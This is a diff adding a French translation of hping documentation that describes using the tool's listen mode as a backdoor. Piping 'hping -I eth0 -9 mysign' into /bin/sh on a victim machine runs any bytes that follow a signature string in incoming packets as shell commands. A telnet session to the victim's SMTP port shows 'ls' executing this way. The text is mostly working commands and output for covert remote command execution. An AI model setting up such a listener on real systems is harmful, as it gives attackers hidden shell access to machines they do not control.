@@ -1,0 +1,37 @@
+hping peut être utilisé comme une backdoor (ndt : porte dérobée). Essayez
+juste l'option -9 (--listen) et redirigez via un tube dans /bin/sh :
+
+Mettez hping en mode listen (ndt : d'écoute) sur le système victime.
+
+victim# hping -I eth0 -9 mysign | /bin/sh
+
+Chaque paquet qui contient "mysign" sera traité par hping, tous les octets
+qui suivent "mysign" dans les paquets seront envoyés dans la sortie
+standard, ainsi par exemple je serai capable d'exécuter des commandes en
+utilisant tous types de protocoles. Juste pour exemple je peux utiliser le
+démon smtpd pour exécuter 'ls' sur la victime.
+
+evil$ telnet victim 25
+
+Trying 192.168.1.1...
+Connected to nano (192.168.1.1).
+Escape character is '^]'.
+220 nano.marmoc.net ESMTP Sendmail
+mysignls;
+
+sur la victime vous verrez :
+
+victim# hping -I eth0 -9 mysign | /bin/sh
+hping2 listen mode
+bin   cdrom  etc     home  local-home  mnt   root  tmp  var
+boot  dev    export  lib   lost+found  proc  sbin  usr
+: command not found
+
+Comme vous pouvez le voir j'utilise 'ls;' puisque sinon le shell recevra
+juste ls^M. Le ";" force l'exécution de la commande (du moins avec bash et
+zsh, vérifiez votre shell pour plus d'informations).
+
+Ceci fonctionne avec tous les types de paquets IP valides non filtrés, le
+niveau supérieur de protocole importe peu.
+
+antirez <antirez@invece.org>
